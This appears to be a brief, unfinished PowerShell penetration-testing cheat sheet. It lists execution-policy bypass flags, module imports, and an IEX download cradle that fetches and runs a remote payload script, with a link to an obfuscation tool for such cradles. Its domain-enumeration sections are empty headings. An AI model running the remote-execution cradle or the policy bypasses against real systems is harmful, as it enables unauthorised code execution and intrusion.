## BASICS:  

**Check Execution Policy**:  
1. Get-ExecutionPolicy  

**Bypass execution policy**:  
1. powershell -executionpolicy bypass .\script.ps1  
2. powershell -ep bypass  
3. powershell -c <cmd>  
4. powershell -enc  
  
**Import Modules**:  
1. . .\script.ps1  
2. Import-Module <path to script>  

**List Available modules**:  
1. Get-Module -ListAvailable  

** All commands in the module**:  
1. Get-Command -Module <module name>  
  
## COMMAND EXECUTION:  
**IEX**:  (**!= OPSEC**)
1. iex (New-Object Net.webClient).DownloadString('http://server/payload.ps1')  

**IEX Obfuscator**: https://github.com/danielbohannon/Invoke-CradleCrafter.git  
  
## DOMAIN ENUMERATION (POWERVIEW):  
  
 

## DOMAIN ENUMERATION (ACTIVE DIRECTORY TOOLS):  
  

  
